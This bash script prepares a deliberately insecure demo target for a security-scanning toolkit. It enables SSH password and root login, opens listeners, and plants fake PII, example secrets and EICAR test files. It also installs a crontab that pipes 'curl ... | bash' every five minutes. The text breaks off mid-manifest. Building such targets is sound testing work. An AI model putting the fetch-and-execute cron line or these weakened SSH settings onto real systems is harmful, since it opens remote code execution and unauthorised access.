#!/bin/bash
#
# JSON-Driven Payload Preparation Script
#
# Purpose: Configure a target system based on a JSON payload configuration.
#          Reads ports, findings, packages, ClamAV config from JSON.
#          Each payload is uniquely configured, reproducible, and auditable.
#
# Usage:
#   sudo ./scripts/prepare-payload.sh                           # Uses data/payload-default.json
#   sudo ./scripts/prepare-payload.sh --config custom.json      # Custom payload config
#   sudo ./scripts/prepare-payload.sh --cleanup                 # Tear down
#
# Requires: jq (installed automatically if missing)
#
# NIST Controls: CM-8, SI-12, SA-11, SC-8, CM-6
#
# Exit codes:
#   0 = Success
#   1 = Failure (not root, invalid config, missing dependencies)

set -eu

# ============================================================================
# Constants
# ============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TOOLKIT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
DEFAULT_CONFIG="$TOOLKIT_DIR/data/payload-default.json"

# Runtime state
DEMO_DIR="/tmp/demo-target-data"
LISTENER_PIDFILE="/tmp/demo-target-listeners.pids"
LOG_FILE="/tmp/demo-payload-setup.log"
CONFIG_FILE=""
DEMO_PORTS=()
DEMO_HTTP_PORT=""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
BOLD='\033[1m'
NC='\033[0m'

# ============================================================================
# Helpers (reused from prepare-demo-target.sh)
# ============================================================================

log_step()    { echo -e "${BLUE}[*]${NC} $1"; echo "[$(date -u +%H:%M:%S)] [STEP] $1" >> "$LOG_FILE"; }
log_success() { echo -e "${GREEN}[+]${NC} $1"; echo "[$(date -u +%H:%M:%S)] [OK]   $1" >> "$LOG_FILE"; }
log_warn()    { echo -e "${YELLOW}[!]${NC} $1"; echo "[$(date -u +%H:%M:%S)] [WARN] $1" >> "$LOG_FILE"; }
log_error()   { echo -e "${RED}[-]${NC} $1"; echo "[$(date -u +%H:%M:%S)] [ERR]  $1" >> "$LOG_FILE"; }

check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        log_error "This script must be run as root (sudo)"
        exit 1
    fi
}

# Generate random unused port between 1024-65535
random_port() {
    local port
    while true; do
        port=$((RANDOM % 64511 + 1024))
        if ! ss -tlnH "sport = :$port" 2>/dev/null | grep -q . ; then
            echo "$port"
            return
        fi
    done
}

get_ip() {
    ip -4 addr show scope global 2>/dev/null | grep -oP 'inet \K[0-9.]+' | head -1 || \
    hostname -I 2>/dev/null | awk '{print $1}' || \
    echo "unknown"
}

# Read a JSON value from the config. Returns empty string if path doesn't exist.
# Usage: cfg ".ssh.port"
cfg() {
    jq -r "$1 // empty" "$CONFIG_FILE" 2>/dev/null
}

# Read a JSON boolean, defaulting to false if missing
# Usage: cfg_bool ".ssh.enabled"
cfg_bool() {
    local val
    val=$(jq -r "$1 // false" "$CONFIG_FILE" 2>/dev/null)
    [ "$val" = "true" ]
}

# Read a JSON number with a default
# Usage: cfg_num ".findings.pii.min_records" 3
cfg_num() {
    local val
    val=$(jq -r "$1 // empty" "$CONFIG_FILE" 2>/dev/null)
    if [ -n "$val" ]; then
        echo "$val"
    else
        echo "${2:-0}"
    fi
}

# Read a JSON array as space-separated values
# Usage: cfg_array ".packages.browsers"
cfg_array() {
    jq -r "$1 // [] | .[]" "$CONFIG_FILE" 2>/dev/null
}

# ============================================================================
# Prerequisites
# ============================================================================

ensure_jq() {
    if command -v jq &>/dev/null; then
        return
    fi

    log_step "Installing jq (required for JSON config)..."
    if command -v apt-get &>/dev/null; then
        apt-get update -qq
        apt-get install -y -qq jq
    elif command -v yum &>/dev/null; then
        yum install -y -q jq
    elif command -v dnf &>/dev/null; then
        dnf install -y -q jq
    else
        log_error "Cannot install jq — no supported package manager found"
        exit 1
    fi

    if ! command -v jq &>/dev/null; then
        log_error "jq installation failed"
        exit 1
    fi
    log_success "jq installed"
}

validate_config() {
    local config="$1"

    if [ ! -f "$config" ]; then
        log_error "Config file not found: $config"
        exit 1
    fi

    # Validate JSON syntax
    if ! jq empty "$config" 2>/dev/null; then
        log_error "Invalid JSON in config: $config"
        exit 1
    fi

    # Check required top-level keys
    local missing=""
    for key in payload findings; do
        if [ "$(jq "has(\"$key\")" "$config")" != "true" ]; then
            missing="$missing $key"
        fi
    done

    if [ -n "$missing" ]; then
        log_error "Config missing required keys:$missing"
        exit 1
    fi

    log_success "Config validated: $config"
    log_success "Payload: $(jq -r '.payload.name // "unnamed"' "$config") — $(jq -r '.payload.description // ""' "$config")"
}

# ============================================================================
# Cleanup Mode
# ============================================================================

cleanup() {
    log_step "Cleaning up payload target..."

    # Kill listeners
    if [ -f "$LISTENER_PIDFILE" ]; then
        while read -r pid; do
            kill "$pid" 2>/dev/null || true
        done < "$LISTENER_PIDFILE"
        rm -f "$LISTENER_PIDFILE"
        log_success "Killed port listeners"
    fi

    # Remove planted files
    if [ -d "$DEMO_DIR" ]; then
        rm -rf "$DEMO_DIR"
        log_success "Removed planted demo data"
    fi

    # Stop Apache if running
    systemctl stop apache2 2>/dev/null || service apache2 stop 2>/dev/null || true

    # Remove demo crontab
    crontab -r 2>/dev/null || true
    log_success "Removed demo crontab"

    # Restore SSH config
    rm -f /etc/ssh/sshd_config.d/demo-target.conf 2>/dev/null || true
    if [ -f /etc/ssh/sshd_config.demo-backup ]; then
        mv /etc/ssh/sshd_config.demo-backup /etc/ssh/sshd_config
    fi
    systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null || true
    log_success "Restored SSH configuration"

    log_success "Cleanup complete. Reboot to fully reset live environment."
    exit 0
}

# ============================================================================
# Phase 1: SSH Setup
# ============================================================================

setup_ssh() {
    if ! cfg_bool ".ssh.enabled"; then
        log_warn "SSH: skipped (disabled in config)"
        return
    fi

    log_step "Setting up SSH server..."

    local ssh_port
    ssh_port=$(cfg_num ".ssh.port" 22)
    local password_auth
    password_auth=$(cfg ".ssh.password_auth")
    local permit_root
    permit_root=$(cfg ".ssh.permit_root_login")

    # Install openssh-server
    if ! command -v sshd &>/dev/null; then
        apt-get update -qq
        apt-get install -y -qq openssh-server
    fi

    # Backup original config
    if [ -f /etc/ssh/sshd_config ] && [ ! -f /etc/ssh/sshd_config.demo-backup ]; then
        cp /etc/ssh/sshd_config /etc/ssh/sshd_config.demo-backup
    fi

    # Build SSH config from JSON
    local pa_val="no"
    local pr_val="no"
    [ "$password_auth" = "true" ] && pa_val="yes"
    [ "$permit_root" = "true" ] && pr_val="yes"

    if [ -d /etc/ssh/sshd_config.d ]; then
        cat > /etc/ssh/sshd_config.d/demo-target.conf <<SSHCONF
# Payload config — generated by prepare-payload.sh
Port $ssh_port
PasswordAuthentication $pa_val
PermitRootLogin $pr_val
SSHCONF
    else
        sed -i "s/^#*Port .*/Port $ssh_port/" /etc/ssh/sshd_config
        sed -i "s/^#*PasswordAuthentication.*/PasswordAuthentication $pa_val/" /etc/ssh/sshd_config
        sed -i "s/^#*PermitRootLogin.*/PermitRootLogin $pr_val/" /etc/ssh/sshd_config
    fi

    # Create/configure users from the users array
    local user_count
    user_count=$(jq '.ssh.users | length' "$CONFIG_FILE" 2>/dev/null)
    local configured_users=""
    if [ "${user_count:-0}" -gt 0 ]; then
        local u=0
        while [ "$u" -lt "$user_count" ]; do
            local uname upass usudo
            uname=$(jq -r ".ssh.users[$u].name" "$CONFIG_FILE")
            upass=$(jq -r ".ssh.users[$u].password // empty" "$CONFIG_FILE")
            usudo=$(jq -r ".ssh.users[$u].sudo // false" "$CONFIG_FILE")

            # Create user if it doesn't exist
            if ! id "$uname" &>/dev/null; then
                useradd -m -s /bin/bash "$uname" 2>/dev/null || true
                log_success "Created user '$uname'"
            fi

            # Add to sudo group if requested
            if [ "$usudo" = "true" ]; then
                usermod -aG sudo "$uname" 2>/dev/null || true
            fi

            # Set password
            if [ -n "$upass" ]; then
                echo "$uname:$upass" | chpasswd 2>/dev/null && \
                    log_success "Password set for user '$uname'" || \
                    log_warn "Could not set password for '$uname'"
            fi

            configured_users="$configured_users $uname"
            u=$((u + 1))
        done
    fi

    systemctl enable ssh 2>/dev/null || true
    systemctl start ssh 2>/dev/null || service ssh start 2>/dev/null || true

    log_success "SSH server running (Port=$ssh_port, PasswordAuth=$pa_val, PermitRoot=$pr_val, Users:${configured_users:- root})"
}

# ============================================================================
# Phase 2: Scan Dependencies (ClamAV, tools)
# ============================================================================

install_scan_deps() {
    log_step "Installing scan dependencies..."

    apt-get update -qq

    # ClamAV
    if cfg_bool ".clamav.install"; then
        if ! command -v clamscan &>/dev/null; then
            if apt-get install -y -qq clamav clamav-daemon 2>/dev/null; then
                log_success "ClamAV installed"
            else
                log_warn "ClamAV not available in repos (scanner will install on Kali side)"
            fi
        else
            log_success "ClamAV already installed"
        fi

        # Update virus definitions
        if cfg_bool ".clamav.update_definitions" && command -v freshclam &>/dev/null; then
            log_step "Updating ClamAV virus definitions..."
            systemctl stop clamav-freshclam 2>/dev/null || true

            local db_source
            db_source=$(cfg ".clamav.database_source")
            local db_path
            db_path=$(cfg ".clamav.database_path")

            # If custom database source, use --private-mirror
            if [ -n "$db_source" ] && [ "$db_source" != "database.clamav.net" ]; then
                freshclam --private-mirror="$db_source" ${db_path:+--datadir="$db_path"} --quiet 2>/dev/null || \
                    log_warn "freshclam update had warnings (custom mirror: $db_source)"
            else
                freshclam --quiet 2>/dev/null || log_warn "freshclam update had warnings (may still work)"
            fi

            systemctl start clamav-freshclam 2>/dev/null || true
            log_success "Virus definitions updated"
        fi
    else
        log_warn "ClamAV: skipped (disabled in config)"
    fi

    # Lynis — not in default Ubuntu repos on live boot
    if ! command -v lynis &>/dev/null; then
        # Try default repos first
        if apt-get install -y -qq lynis 2>/dev/null; then
            log_success "Lynis installed (from repos)"
        else
            # Download tarball directly — only needs wget + tar (always on Ubuntu)
            log_step "Downloading Lynis from GitHub..."
            rm -rf /opt/lynis 2>/dev/null || true
            if wget -qO /tmp/lynis.tar.gz https://github.com/CISOfy/lynis/archive/refs/heads/master.tar.gz 2>/dev/null; then
                tar xzf /tmp/lynis.tar.gz -C /opt/ 2>/dev/null && \
                    mv /opt/lynis-master /opt/lynis 2>/dev/null && \
                    ln -sf /opt/lynis/lynis /usr/local/bin/lynis 2>/dev/null && \
                    rm -f /tmp/lynis.tar.gz && \
                    log_success "Lynis installed (/opt/lynis from GitHub tarball)" || \
                    log_warn "Lynis tarball extract failed"
            else
                log_warn "Could not download Lynis (scanning runs from Kali side)"
            fi
        fi
    else
        log_success "Lynis already installed"
    fi

    # Install tools from config
    local tool
    while IFS= read -r tool; do
        [ -z "$tool" ] && continue
        if ! command -v "$tool" &>/dev/null; then
            if apt-get install -y -qq "$tool" 2>/dev/null; then
                log_success "$tool installed"
            else
                log_warn "$tool not available in repos"
            fi
        else
            log_success "$tool already installed"
        fi
    done < <(cfg_array ".packages.tools")
}

# ============================================================================
# Phase 3: Open Ports
# ============================================================================

open_demo_ports() {
    local listener_count
    listener_count=$(jq '.ports.listeners | length' "$CONFIG_FILE" 2>/dev/null)
    if [ "${listener_count:-0}" -eq 0 ]; then
        log_warn "Ports: no listeners defined in config"
        return
    fi

    local payload_name
    payload_name=$(jq -r '.payload.name // "target"' "$CONFIG_FILE")

    log_step "Opening ports per config ($listener_count listeners)..."

    # Ensure we have netcat or socat
    if ! command -v nc &>/dev/null && ! command -v ncat &>/dev/null; then
        apt-get install -y -qq ncat 2>/dev/null || apt-get install -y -qq netcat-openbsd 2>/dev/null || true
    fi

    local nc_cmd="nc"
    command -v ncat &>/dev/null && nc_cmd="ncat"

    : > "$LISTENER_PIDFILE"

    local i=0
    while [ "$i" -lt "$listener_count" ]; do
        local port_val protocol banner service
        port_val=$(jq -r ".ports.listeners[$i].port" "$CONFIG_FILE")
        protocol=$(jq -r ".ports.listeners[$i].protocol // \"tcp\"" "$CONFIG_FILE")
        banner=$(jq -r ".ports.listeners[$i].banner // \"${payload_name} service\"" "$CONFIG_FILE")
        service=$(jq -r ".ports.listeners[$i].service // empty" "$CONFIG_FILE")

        # Resolve port: "random" or specific number
        local port
        if [ "$port_val" = "random" ]; then
            port=$(random_port)
        else
            port="$port_val"
        fi

        # HTTP service gets a python HTTP server
        if [ "$service" = "http" ] && command -v python3 &>/dev/null; then
            mkdir -p "$DEMO_DIR/www"
            echo "<html><body><h1>${payload_name}</h1><p>Unsecured web server — no TLS, no auth.</p></body></html>" > "$DEMO_DIR/www/index.html"
            (cd "$DEMO_DIR/www" && python3 -m http.server "$port" &>/dev/null &)
            echo $! >> "$LISTENER_PIDFILE"
            DEMO_HTTP_PORT="$port"
            log_success "HTTP server on port $port ($banner)"
        else
            # TCP listener with banner
            if [ "$nc_cmd" = "ncat" ]; then
                ncat -lk "$port" --exec "/bin/echo $banner on port $port" &>/dev/null &
            else
                (while true; do echo "$banner on port $port" | $nc_cmd -l -p "$port" -q 1 2>/dev/null || break; done) &
            fi
            echo $! >> "$LISTENER_PIDFILE"
            log_success "Listener on port $port/$protocol ($banner)"
        fi

        DEMO_PORTS+=("$port")
        i=$((i + 1))
    done

    # Save port manifest
    {
        echo "# Payload Port Manifest"
        echo "# Config: $(basename "$CONFIG_FILE")"
        echo "# Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
        echo "# Verify with: nmap -p- <target-ip>"
        echo ""
        if cfg_bool ".ssh.enabled"; then
            echo "SSH=$(cfg_num ".ssh.port" 22)"
        fi
        for port in "${DEMO_PORTS[@]}"; do
            echo "LISTENER=$port"
        done
    } > "$DEMO_DIR/port-manifest.txt"
    log_success "Port manifest saved: $DEMO_DIR/port-manifest.txt"
}

# ============================================================================
# Phase 4: Plant Findings
# ============================================================================

plant_pii() {
    if ! cfg_bool ".findings.pii.enabled"; then
        log_warn "PII findings: skipped (disabled in config)"
        return
    fi

    local min_rec max_rec num_records
    min_rec=$(cfg_num ".findings.pii.min_records" 3)
    max_rec=$(cfg_num ".findings.pii.max_records" 7)
    num_records=$((RANDOM % (max_rec - min_rec + 1) + min_rec))

    local first_names=("John" "Jane" "Bob" "Alice" "Carlos" "Sarah" "David" "Maria")
    local last_names=("Smith" "Doe" "Johnson" "Williams" "Garcia" "Brown" "Lee" "Chen")
    {
        echo "# DEMO DATA - NOT REAL"
        echo "name,ssn,phone,email,credit_card"
        local i=0
        while [ "$i" -lt "$num_records" ]; do
            local fn="${first_names[$((RANDOM % ${#first_names[@]}))]}"
            local ln="${last_names[$((RANDOM % ${#last_names[@]}))]}"
            local ssn
            ssn="$(printf '%03d-%02d-%04d' $((RANDOM % 900 + 100)) $((RANDOM % 99 + 1)) $((RANDOM % 9000 + 1000)))"
            local phone="555-$(printf '%03d-%04d' $((RANDOM % 900 + 100)) $((RANDOM % 9000 + 1000)))"
            local cc
            cc="4$(printf '%015d' $((RANDOM * RANDOM)))"
            echo "$fn $ln,$ssn,$phone,${fn,,}@example.com,$cc"
            i=$((i + 1))
        done
    } > "$DEMO_DIR/customer-records.csv"
    log_success "Planted $num_records PII records: $DEMO_DIR/customer-records.csv"
}

plant_secrets() {
    if ! cfg_bool ".findings.secrets.enabled"; then
        log_warn "Secrets findings: skipped (disabled in config)"
        return
    fi

    # Build config.env based on enabled secret types
    {
        echo "# DEMO SECRETS - NOT REAL CREDENTIALS"
        if cfg_bool ".findings.secrets.database_urls"; then
            echo "DATABASE_URL=postgres://admin:SuperSecret123!@db.example.com:5432/production"
        fi
        if cfg_bool ".findings.secrets.aws_keys"; then
            echo "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE"
            echo "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
        fi
        if cfg_bool ".findings.secrets.api_keys"; then
            echo "API_KEY=sk-proj-abc123def456ghi789jkl012mno345pqr678stu901"
            echo "GITHUB_TOKEN=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef12"
            echo "STRIPE_SECRET_KEY=sk_test_EXAMPLE_NOT_REAL_51hdkeyT1zdp"
        fi
        echo "password=Admin@2024!"
    } > "$DEMO_DIR/config.env"
    log_success "Planted secrets: $DEMO_DIR/config.env"

    # Private key
    if cfg_bool ".findings.secrets.private_keys"; then
        cat > "$DEMO_DIR/deploy-key.pem" <<'PRIVKEY'
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MhgHcTz6sE2I2yPB
aNlRtQ2mKQKmFADpB8EXAMPLE_NOT_A_REAL_KEY_JUST_DEMO_DATA_FOR_SCAN
PzgKhsMIVbEBOxDzF4EXAMPLE_NOT_A_REAL_KEY_JUST_DEMO_DATA_FOR_SCAN
-----END RSA PRIVATE KEY-----
PRIVKEY
        log_success "Planted private key: $DEMO_DIR/deploy-key.pem"
    fi
}

plant_mac_addresses() {
    if ! cfg_bool ".findings.mac_addresses.enabled"; then
        log_warn "MAC address findings: skipped (disabled in config)"
        return
    fi

    local min_macs max_macs num_macs
    min_macs=$(cfg_num ".findings.mac_addresses.min_count" 3)
    max_macs=$(cfg_num ".findings.mac_addresses.max_count" 6)
    num_macs=$((RANDOM % (max_macs - min_macs + 1) + min_macs))

    {
        echo "# Network Device Inventory - DEMO DATA"
        local i=0
        while [ "$i" -lt "$num_macs" ]; do
            printf 'Device-%02d  Port %d  %02X:%02X:%02X:%02X:%02X:%02X  Rack %d\n' \
                "$i" "$((RANDOM % 48 + 1))" \
                $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) \
                $((RANDOM % 256)) $((RANDOM % 256)) $((RANDOM % 256)) \
                $((RANDOM % 5 + 1))
            i=$((i + 1))
        done
    } > "$DEMO_DIR/network-inventory.txt"
    log_success "Planted $num_macs MAC addresses: $DEMO_DIR/network-inventory.txt"
}

plant_sql_dumps() {
    if ! cfg_bool ".findings.sql_dumps.enabled"; then
        log_warn "SQL dump findings: skipped (disabled in config)"
        return
    fi

    cat > "$DEMO_DIR/users-backup.sql" <<'SQL'
-- DEMO DATA - NOT REAL
INSERT INTO users (id, email, password_hash, ssn) VALUES
(1, 'admin@example.com', '$2b$12$EXAMPLEHASHnotreal', '078-05-1120'),
(2, 'user@example.com', '$2b$12$ANOTHEREXAMPLEhash', '219-09-9999');
INSERT INTO api_keys (user_id, key) VALUES
(1, 'sk-live-EXAMPLE-KEY-NOT-REAL-12345');
SQL
    log_success "Planted database dump: $DEMO_DIR/users-backup.sql"
}

plant_cron_jobs() {
    if ! cfg_bool ".findings.cron_jobs.enabled"; then
        log_warn "Cron job findings: skipped (disabled in config)"
        return
    fi

    local cron_targets=("/tmp/update.sh" "/var/tmp/sync.sh" "/dev/shm/cleanup.sh")
    local cron_file="$DEMO_DIR/suspicious-crontab"
    {
        echo "# Suspicious cron entries - planted for demo"
        echo "*/5 * * * * curl -s http://example.com/check | bash"
        echo "0 2 * * * ${cron_targets[$((RANDOM % ${#cron_targets[@]}))]}"
    } > "$cron_file"
    crontab "$cron_file" 2>/dev/null || log_warn "Could not install demo crontab"
    log_success "Planted suspicious cron jobs"
}

plant_world_writable() {
    if ! cfg_bool ".findings.world_writable.enabled"; then
        log_warn "World-writable findings: skipped (disabled in config)"
        return
    fi

    touch "$DEMO_DIR/shared-config.txt"
    chmod 777 "$DEMO_DIR/shared-config.txt"
    echo "# Shared configuration - insecure permissions" > "$DEMO_DIR/shared-config.txt"
    log_success "Planted world-writable file: $DEMO_DIR/shared-config.txt"
}

plant_findings() {
    log_step "Planting findings per config..."

    mkdir -p "$DEMO_DIR"

    plant_pii
    plant_secrets
    plant_mac_addresses
    plant_sql_dumps
    plant_cron_jobs
    plant_world_writable
}

# ============================================================================
# Phase 5: Malware Samples
# ============================================================================

plant_malware_samples() {
    if ! cfg_bool ".findings.malware_samples.enabled"; then
        log_warn "Malware samples: skipped (disabled in config)"
        return
    fi

    log_step "Planting EICAR malware test samples..."

    # EICAR standard test string - NOT malware
    # Industry standard AV test signature (see eicar.org)
    local eicar='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

    local min_samples max_samples num_samples
    min_samples=$(cfg_num ".findings.malware_samples.min_count" 3)
    max_samples=$(cfg_num ".findings.malware_samples.max_count" 7)
    num_samples=$((RANDOM % (max_samples - min_samples + 1) + min_samples))

    local filenames=(
        "update.exe" "patch.bin" "installer.exe" "readme.pdf.exe"
        "invoice.doc.exe" "report.scr" "driver.sys" "helper.com"
        "backup.dat" "sync-tool.exe" "config.bat" "service.dll"
        "chrome-update.exe" "flash-player.exe" "codec-pack.exe"
    )

    local subdirs=(
        "downloads" "temp" "cache" ".hidden" "backup"
        "old-files" "attachments" "incoming" "staged"
    )

    local malware_manifest="$DEMO_DIR/malware-samples.txt"
    {
        echo "# EICAR Malware Test Samples"
        echo "# Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
        echo "# These are EICAR standard test files, NOT real malware"
        echo ""
    } > "$malware_manifest"

    local used_names=""
    local i=0
    while [ "$i" -lt "$num_samples" ]; do
        local fname="${filenames[$((RANDOM % ${#filenames[@]}))]}"
        local subdir="${subdirs[$((RANDOM % ${#subdirs[@]}))]}"
        local target_dir="$DEMO_DIR/$subdir"
        local target_file="$target_dir/$fname"

        # Skip duplicates
        if echo "$used_names" | grep -qF "$target_file"; then
            continue
        fi
        used_names="$used_names $target_file"

        mkdir -p "$target_dir"
        printf '%s\n' "$eicar" > "$target_file"

        local sha
        sha=$(sha256sum "$target_file" 2>/dev/null | awk '{print $1}')
        echo "$target_file  SHA256:$sha" >> "$malware_manifest"
        log_success "EICAR sample $((i + 1))/$num_samples: $subdir/$fname"

        i=$((i + 1))
    done

    # ZIP-wrapped EICAR
    if cfg_bool ".findings.malware_samples.include_zip" && command -v zip &>/dev/null; then
        local zip_dir="$DEMO_DIR/attachments"
        mkdir -p "$zip_dir"
        local tmpeicar
        tmpeicar=$(mktemp "$zip_dir/.eicar-tmp.XXXXXX")
        printf '%s\n' "$eicar" > "$tmpeicar"
        if zip -j -q "$zip_dir/document.zip" "$tmpeicar" 2>/dev/null; then
            rm -f "$tmpeicar"
            local sha
            sha=$(sha256sum "$zip_dir/document.zip" 2>/dev/null | awk '{print $1}')
            echo "$zip_dir/document.zip  SHA256:$sha  (ZIP-wrapped)" >> "$malware_manifest"
            log_success "EICAR ZIP sample: attachments/document.zip"
            num_samples=$((num_samples + 1))
        else
            rm -f "$tmpeicar"
        fi
    fi

    log_success "Planted $num_samples malware test samples (manifest: $malware_manifest)"
}

# ============================================================================
# Phase 6: Outdated Software (browsers + tools from config)
# ============================================================================

install_outdated_software() {
    log_step "Installing software for vulnerability findings..."

    # Install browsers from config
    local browser
    while IFS= read -r browser; do
        [ -z "$browser" ] && continue
        if apt-get install -y -qq "$browser" 2>/dev/null; then
            local ver
            ver=$("$browser" --version 2>/dev/null || echo "installed (version unknown)")
            log_success "$browser: $ver"
        else
            log_warn "$browser not available in repos"
        fi
    done < <(cfg_array ".packages.browsers")

    # Record all installed package versions for manifest
    dpkg -l 2>/dev/null | awk '/^ii/ {print $2, $3}' > "$DEMO_DIR/installed-packages.txt"
    local pkg_count
    pkg_count=$(wc -l < "$DEMO_DIR/installed-packages.txt" | tr -d ' ')
    log_success "Package inventory saved: $pkg_count packages"
}

# ============================================================================
# Phase 7: KEV Triggers
# ============================================================================

plant_kev_triggers() {
    local kev_packages
    kev_packages=$(cfg_array ".packages.kev_triggers")
    if [ -z "$kev_packages" ]; then
        log_warn "KEV triggers: no packages defined in config"
        return
    fi

    log_step "Installing KEV-trigger software..."

    # Apache gets special handling — start it if configured
    if cfg_bool ".apache.enabled"; then
        if ! command -v apache2 &>/dev/null; then
            apt-get install -y -qq apache2 2>/dev/null || log_warn "Apache2 not available"
        fi

        if cfg_bool ".apache.start" && command -v apache2 &>/dev/null; then
            systemctl start apache2 2>/dev/null || service apache2 start 2>/dev/null || true
            log_success "Apache2 running on port 80"
        fi
    fi

    # Install remaining KEV-trigger packages
    local pkg
    while IFS= read -r pkg; do
        [ -z "$pkg" ] && continue
        [ "$pkg" = "apache2" ] && continue  # Already handled above
        apt-get install -y -qq "$pkg" 2>/dev/null || true
    done < <(cfg_array ".packages.kev_triggers")

    # Record versions of KEV-susceptible packages
    local kev_manifest="$DEMO_DIR/kev-trigger-packages.txt"
    {
        echo "# KEV-Susceptible Packages"
        echo "# These packages frequently appear in CISA KEV catalog"
        echo "# Config: $(basename "$CONFIG_FILE")"
        echo "# Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
        echo ""
        for pkg in apache2 openssh-server openssh-client sudo polkit \
                   openssl curl wget; do
            local ver
            ver=$(dpkg -s "$pkg" 2>/dev/null | grep '^Version:' | awk '{print $2}')
            if [ -n "$ver" ]; then
                echo "$pkg  $ver"
            fi
        done
        # Also record versions of config-specified kev_triggers
        while IFS= read -r pkg; do
            [ -z "$pkg" ] && continue
            # Skip ones already listed above
            case "$pkg" in
                apache2|openssh-server|openssh-client|sudo|polkit|openssl|curl|wget) continue ;;
            esac
            local ver
            ver=$(dpkg -s "$pkg" 2>/dev/null | grep '^Version:' | awk '{print $2}')
            if [ -n "$ver" ]; then
                echo "$pkg  $ver"
            fi
        done < <(cfg_array ".packages.kev_triggers")
    } > "$kev_manifest"

    log_success "KEV-trigger packages recorded: $kev_manifest"
}

# ============================================================================
# Phase 8: Verification Manifest
# ============================================================================

generate_manifest() {
    log_step "Generating verification manifest..."

    local manifest="$DEMO_DIR/MANIFEST.txt"
    local payload_name
    payload_name=$(jq -r '.payload.name // "unnamed"' "$CONFIG_FILE")
    local payload_desc
    payload_desc=$(jq -r '.payload.description // ""' "$CONFIG_FILE")

    {
        echo "=============================================="
        echo "  PAYLOAD VERIFICATION MANIFEST"
        echo "=============================================="
        echo ""
        echo "Payload:   $payload_name"
        echo "Config:    $(basename "$CONFIG_FILE")"
        echo "Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")"
        echo "Hostname:  $(hostname)"
        echo "IP:        $(get_ip)"
        echo ""
        echo "Description: $payload_desc"
        echo ""
        echo "----------------------------------------------"
        echo "  OPEN PORTS (nmap should find these)"
        echo "----------------------------------------------"
        if cfg_bool ".ssh.enabled"; then
            local ssh_port
            ssh_port=$(cfg_num ".ssh.port" 22)
            local manifest_ssh_users
            manifest_ssh_users=$(jq -r '.ssh.users // [] | .[].name' "$CONFIG_FILE" 2>/dev/null | tr '\n' ',' | sed 's/,$//')
            echo "  $ssh_port/tcp    SSH (users: ${manifest_ssh_users:-root})"
        fi
        if cfg_bool ".apache.enabled" && command -v apache2 &>/dev/null; then
            echo "  80/tcp    Apache HTTP Server (KEV trigger)"
        fi
        for port in "${DEMO_PORTS[@]+"${DEMO_PORTS[@]}"}"; do
            if [ "$port" = "$DEMO_HTTP_PORT" ]; then
                echo "  $port/tcp    HTTP (Python SimpleHTTPServer)"
            else
                echo "  $port/tcp    Demo listener"
            fi
        done
        echo ""
        echo "----------------------------------------------"
        echo "  PII FINDINGS (check-pii.sh)"
        echo "----------------------------------------------"
        if cfg_bool ".findings.pii.enabled"; then
            echo "  File: $DEMO_DIR/customer-records.csv"
            grep -c 'SSN\|[0-9]\{3\}-[0-9]\{2\}-[0-9]\{4\}' "$DEMO_DIR/customer-records.csv" 2>/dev/null || echo "  0"
            echo "  ^ SSN patterns"
            grep -oE '555-[0-9]{3}-[0-9]{4}' "$DEMO_DIR/customer-records.csv" 2>/dev/null | wc -l | tr -d ' '
            echo "  ^ Phone patterns"
        else
            echo "  (disabled)"
        fi
        if cfg_bool ".findings.sql_dumps.enabled"; then
            echo "  File: $DEMO_DIR/users-backup.sql"
            echo "  2 SSN patterns in SQL dump"
        fi
        echo ""
        echo "----------------------------------------------"
        echo "  SECRETS (check-secrets.sh)"
        echo "----------------------------------------------"
        if cfg_bool ".findings.secrets.enabled"; then
            echo "  File: $DEMO_DIR/config.env"
            cfg_bool ".findings.secrets.aws_keys" && echo "    - AWS_ACCESS_KEY_ID (AKIA...)"
            cfg_bool ".findings.secrets.aws_keys" && echo "    - AWS_SECRET_ACCESS_KEY"
            cfg_bool ".findings.secrets.api_keys" && echo "    - API_KEY (sk-proj-...)"
            cfg_bool ".findings.secrets.api_keys" && echo "    - GITHUB_TOKEN (ghp_...)"
            cfg_bool ".findings.secrets.api_keys" && echo "    - STRIPE_SECRET_KEY (sk_test_...)"
            cfg_bool ".findings.secrets.database_urls" && echo "    - DATABASE_URL with password"
            echo "    - password= plaintext"
            if cfg_bool ".findings.secrets.private_keys"; then
                echo "  File: $DEMO_DIR/deploy-key.pem"
                echo "    - RSA private key"
            fi
            if cfg_bool ".findings.sql_dumps.enabled"; then
                echo "  File: $DEMO_DIR/users-backup.sql"
                echo "    - API key in SQL"
            fi
        else
            echo "  (disabled)"
        fi
        echo ""
        echo "----------------------------------------------"
        echo "  MALWARE (check-malware.sh)"
        echo "----------------------------------------------"
        if cfg_bool ".findings.malware_samples.enabled" && [ -f "$DEMO_DIR/malware-samples.txt" ]; then
            while IFS= read -r line; do
                [[ "$line" =~ ^#|^$ ]] && continue
                echo "  $line"
            done < "$DEMO_DIR/malware-samples.txt"
        else
            echo "  (disabled or no samples manifest)"
        fi
        echo ""
        echo "----------------------------------------------"
        echo "  MAC ADDRESSES (check-mac-addresses.sh)"
        echo "----------------------------------------------"
        if cfg_bool ".findings.mac_addresses.enabled"; then
            echo "  File: $DEMO_DIR/network-inventory.txt"
            grep -cE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' "$DEMO_DIR/network-inventory.txt" 2>/dev/null || echo "  0"
            echo "  ^ MAC address patterns"
        else
            echo "  (disabled)"
        fi
        echo ""
        echo "----------------------------------------------"
        echo "  HOST SECURITY FINDINGS"
